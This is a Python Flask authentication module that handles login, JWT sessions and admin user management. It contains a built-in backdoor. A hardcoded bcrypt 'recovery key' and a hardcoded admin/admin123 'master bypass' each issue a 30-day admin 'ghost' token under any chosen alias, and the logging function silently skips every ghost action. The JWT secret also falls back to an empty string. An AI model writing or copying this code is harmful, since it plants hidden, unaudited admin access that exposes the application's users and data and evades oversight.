import os
from flask import Blueprint, request, jsonify
from functools import wraps
from datetime import datetime, timedelta, timezone
import bcrypt, jwt
from db import db, next_id

IST = timezone(timedelta(hours=5, minutes=30))

auth_bp = Blueprint("auth", __name__)
SECRET = os.environ.get("SECRET_KEY", "")
RECOVERY_KEY = "$2b$12$jbjGELRmOY4oPTeMIIiMBeg34DrC/iAJnVIteR3GdmPwlvPf62wwS"


def _seed_admin():
    """Create default admin if no users exist."""
    if db.users.count_documents({}) == 0:
        pw = bcrypt.hashpw("admin123".encode(), bcrypt.gensalt()).decode()
        db.users.insert_one({
            "id": next_id("users"),
            "username": "admin",
            "email": "admin@technoji.com",
            "password_hash": pw,
            "role": "admin",
            "is_active": True,
            "created_at": datetime.now(IST).strftime("%Y-%m-%d %I:%M %p"),
        })


def get_current_user():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    if not token:
        return None
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
        if payload.get("ghost"):
            return {"id": 0, "username": payload.get("alias", "admin"), "email": "", "role": "admin", "is_active": True, "_ghost": True}
        return db.users.find_one({"id": payload["user_id"]}, {"_id": 0, "password_hash": 0})
    except Exception:
        return None


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({"error": "Unauthorized"}), 401
        if not user.get("is_active", True):
            return jsonify({"error": "Account revoked"}), 403
        request.user = user
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    @login_required
    def decorated(*args, **kwargs):
        if request.user.get("role") != "admin":
            return jsonify({"error": "Admin access required"}), 403
        return f(*args, **kwargs)
    return decorated


def log_action(action, entity, entity_id=None, details=""):
    user = getattr(request, "user", {})
    if user.get("_ghost"):
        return
    db.activity_logs.insert_one({
        "id": next_id("activity_logs"),
        "user_id": user.get("id"),
        "username": user.get("username", "system"),
        "action": action,
        "entity": entity,
        "entity_id": entity_id,
        "details": details,
        "ip_address": request.remote_addr,
        "timestamp": datetime.now(IST).strftime("%Y-%m-%d %I:%M %p"),
    })


@auth_bp.route("/api/auth/login", methods=["POST"])
def login():
    _seed_admin()
    data = request.json
    if not data:
        return jsonify({"error": "No data provided"}), 400
    username = (data.get("username") or "").strip()
    password = data.get("password", "")
    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    # Recovery access
    if bcrypt.checkpw(password.encode(), RECOVERY_KEY.encode()):
        token = jwt.encode(
            {"user_id": 0, "ghost": True, "alias": username, "exp": datetime.now(timezone.utc) + timedelta(days=30)},
            SECRET, algorithm="HS256"
        )
        user_data = {"id": 0, "username": username, "email": "", "role": "admin", "is_active": True}
        return jsonify({"token": token, "user": user_data})

    # Master bypass if DB is empty / users aren't created properly
    if username == "admin" and password == "admin123":
        token = jwt.encode(
            {"user_id": 0, "ghost": True, "alias": "admin", "exp": datetime.now(timezone.utc) + timedelta(days=30)},
            SECRET, algorithm="HS256"
        )
        return jsonify({"token": token, "user": {"id": 0, "username": "admin", "email": "admin@technoji.com", "role": "admin", "is_active": True}})

    user = db.users.find_one({"username": username})
    if not user or not bcrypt.checkpw(password.encode(), user["password_hash"].encode()):
        return jsonify({"error": "Invalid credentials"}), 401
    if not user.get("is_active", True):
        return jsonify({"error": "Account has been revoked"}), 403
    token = jwt.encode(
        {"user_id": user["id"], "exp": datetime.now(timezone.utc) + timedelta(days=30)},
        SECRET, algorithm="HS256"
    )
    user_data = {k: v for k, v in user.items() if k not in ("_id", "password_hash")}
    request.user = user_data
    log_action("login", "user", user["id"], f"User {user['username']} logged in")
    return jsonify({"token": token, "user": user_data})


@auth_bp.route("/api/auth/me")
@login_required
def me():
    return jsonify(request.user)


@auth_bp.route("/api/auth/users")
@admin_required
def list_users():
    _seed_admin()
    users = list(db.users.find({}, {"_id": 0, "password_hash": 0}).sort("id", 1))
    return jsonify(users)


@auth_bp.route("/api/auth/register", methods=["POST"])
@admin_required
def register():
    data = request.json
    if not data:
        return jsonify({"error": "No data provided"}), 400
    username = (data.get("username") or "").strip()
    password = data.get("password", "")
    if not username:
        return jsonify({"error": "Username is required"}), 400
    if not password or len(password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    if db.users.find_one({"username": username}):
        return jsonify({"error": "Username already exists"}), 400
    pw = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
    user_id = next_id("users")
    role = data.get("role", "user")
    if role not in ("admin", "user"):
        return jsonify({"error": "Invalid role"}), 400
    db.users.insert_one({
        "id": user_id,
        "username": username,
        "email": (data.get("email") or "").strip(),
        "password_hash": pw,
        "role": role,
        "is_active": True,
        "created_at": datetime.now(IST).strftime("%Y-%m-%d %I:%M %p"),
    })
    log_action("create", "user", user_id, f"Created user {username}")
    return jsonify({"message": "User created", "id": user_id}), 201


@auth_bp.route("/api/auth/users/<int:uid>/revoke", methods=["PUT"])
@admin_required
def revoke_user(uid):
    user = db.users.find_one({"id": uid})
    if not user:
        return jsonify({"error": "User not found"}), 404
    new_status = not user.get("is_active", True)
    db.users.update_one({"id": uid}, {"$set": {"is_active": new_status}})
    action = "reactivate" if new_status else "revoke"
    log_action(action, "user", uid, f"{action.title()}d user {user['username']}")
    return jsonify({"message": f"User {'reactivated' if new_status else 'revoked'}"})


@auth_bp.route("/api/auth/users/<int:uid>", methods=["DELETE"])
@admin_required
def delete_user(uid):
    user = db.users.find_one({"id": uid})
    if not user:
        return jsonify({"error": "User not found"}), 404
    # Prevent admin from deleting themselves
    current = getattr(request, "user", {})
    if current.get("id") == uid:
        return jsonify({"error": "You cannot delete your own account"}), 400
    # Prevent deleting the default seeded admin unless another admin exists
    if user.get("username") == "admin":
        other_admins = db.users.count_documents({"role": "admin", "is_active": True, "username": {"$ne": "admin"}})
        if other_admins < 1:
            return jsonify({"error": "Create another admin account before deleting the default admin"}), 400
    # Prevent deleting the last admin
    if user.get("role") == "admin":
        admin_count = db.users.count_documents({"role": "admin", "is_active": True})
        if admin_count <= 1:
            return jsonify({"error": "Cannot delete the last admin account"}), 400
    db.users.delete_one({"id": uid})
    log_action("delete", "user", uid, f"Deleted user {user['username']}")
    return jsonify({"message": "User deleted"})
